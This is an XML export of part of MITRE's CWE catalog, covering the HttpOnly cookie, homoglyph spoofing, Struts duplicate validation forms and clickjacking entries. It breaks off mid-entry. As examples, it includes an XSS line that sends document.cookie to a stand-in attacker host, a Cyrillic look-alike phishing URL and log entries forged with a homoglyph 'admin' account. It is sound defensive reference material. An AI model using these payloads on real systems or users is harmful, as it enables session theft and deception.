<?xml version="1.0" encoding="UTF-8"?><Weakness_Catalog Name="CWE" Version="4.13" Date="2023-10-26" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://cwe.mitre.org/cwe-7 http://cwe.mitre.org/data/xsd/cwe_schema_v7.1.xsd" xmlns:xhtml="http://www.w3.org/1999/xhtml">
	<Weaknesses>
      <Weakness ID="1004" Name="Sensitive Cookie Without 'HttpOnly' Flag" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.</Description>
         <Extended_Description>The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Leverage the HttpOnly flag when setting a sensitive cookie in a response.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text>
               <Body_Text>The snippet of code below establishes a new cookie to hold the sessionID.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>response.addCookie(c);</xhtml:div>
               </Example_Code>
               <Body_Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</xhtml:div>
               </Example_Code>
               <Body_Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Body_Text>
               <Body_Text>To mitigate the risk, use the setHttpOnly(true) method.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>c.setHttpOnly(true);<xhtml:br/>response.addCookie(c);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24045</Reference>
               <Description>Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24045</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-3852</Reference>
               <Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-3852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4138</Reference>
               <Description>Appliance for managing encrypted communications does not use HttpOnly flag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-4138</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-2"/>
            <Reference External_Reference_ID="REF-3"/>
            <Reference External_Reference_ID="REF-4"/>
            <Reference External_Reference_ID="REF-5"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-01-02</Submission_Date>
               <Submission_Version>2.10</Submission_Version>
               <Submission_ReleaseDate>2017-01-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1007" Name="Insufficient Visual Distinction of Homoglyphs Presented to User" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.</Description>
         <Extended_Description>
            <xhtml:p>Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase "l" (ell) and uppercase "I" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter "A" and the Greek capital letter "Α" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark "À" and its equivalent "Á" with the acute accent.</xhtml:p>
            <xhtml:p>Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="451" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Homograph Attack</Term>
               <Description>"Homograph" is often used as a synonym of "homoglyph" by researchers, but according to Wikipedia, a homograph is a word that has multiple, distinct meanings.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness may occur when characters from various character sets are allowed to be interchanged within a URL, username, email address, etc. without any notification to the user or underlying system being used.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.</xhtml:p>
                  <xhtml:p>Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.</xhtml:p>
                  <xhtml:p>Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following looks like a simple, trusted URL that a user may frequently access.</Intro_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://www.еxаmрlе.соm</xhtml:div>
               </Example_Code>
               <Body_Text>However, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The "e" is actually the "CYRILLIC SMALL LETTER IE" which is represented in HTML as the character &amp;#x435, while the "a" is actually the "CYRILLIC SMALL LETTER A" which is represented in HTML as the character &amp;#x430.  The "p", "c", and "o" are also Cyrillic characters in this example. Viewing the source reveals a URL of "http://www.&amp;#x435;x&amp;#x430;m&amp;#x440;l&amp;#x435;.&amp;#x441;&amp;#x43e;m". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following displays an example of how creating usernames containing homoglyphs can lead to log forgery.</Intro_Text>
               <Body_Text>Assume an adversary visits a legitimate, trusted domain and creates an account named "admin", except the 'a' and 'i' characters are Cyrillic characters instead of the expected ASCII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account.</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>123.123.123.123 аdmіn [17/Jul/2017:09:05:49 -0400] "GET /example/users/userlist HTTP/1.1" 401 12846<xhtml:br/>
		  123.123.123.123 аdmіn [17/Jul/2017:09:06:51 -0400] "GET /example/users/userlist HTTP/1.1" 200 4523<xhtml:br/>
		  123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] "GET /example/users/editusers HTTP/1.1" 200 6291<xhtml:br/>
		  123.123.123.123 аdmіn [17/Jul/2017:09:10:02 -0400] "GET /example/users/editusers HTTP/1.1" 200 6291<xhtml:br/>
		  </xhtml:div>
               </Example_Code>
               <Body_Text>Upon closer inspection, the account that generated three of these log entries is "&amp;#x430;dm&amp;#x456;n". Only the third log entry is by the legitimate admin account. This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate "admin" account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2013-7236</Reference>
               <Description>web forum allows impersonation of users with homoglyphs in account names</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-7236</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0584</Reference>
               <Description>Improper character restriction in URLs in web browser</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0584</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0652</Reference>
               <Description>Incomplete denylist does not include homoglyphs of "/" and "?" characters in URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0652</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-5015</Reference>
               <Description>web browser does not convert hyphens to punycode, allowing IDN spoofing in URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-5015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0233</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0233</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0234</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0234</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0235</Reference>
               <Description>homoglyph spoofing using punycode in URLs and certificates</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0235</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="632"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Canonical Representation Issues&#34;, Page 382"/>
            <Reference External_Reference_ID="REF-8"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-07-24</Submission_Date>
               <Submission_Version>2.12</Submission_Version>
               <Submission_ReleaseDate>2017-11-08</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="102" Name="Struts: Duplicate Validation Forms" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.</Description>
         <Extended_Description>If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="694" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="1173" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Two validation forms with the same name.</Intro_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;form-validation&gt;<xhtml:div style="margin-left:1em;">&lt;formset&gt;<xhtml:div style="margin-left:1em;">&lt;form name="ProjectForm"&gt; ... &lt;/form&gt;<xhtml:br/>&lt;form name="ProjectForm"&gt; ... &lt;/form&gt;</xhtml:div>&lt;/formset&gt;</xhtml:div>&lt;/form-validation&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>It is critically important that validation logic be maintained and kept in sync with the rest of the product.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Struts: Duplicate Validation Forms</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1021" Name="Improper Restriction of Rendered UI Layers or Frames" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.</Description>
         <Extended_Description>A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="441" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="451" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Clickjacking</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>UI Redress Attack</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Tapjacking</Term>
               <Description>"Tapjacking" is similar to clickjacking, except it is used for mobile applications in which the user "taps" the application instead of performing a mouse click.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.</xhtml:p>
                  <xhtml:p>The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>A developer can use a "frame-breaker" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.</xhtml:p>
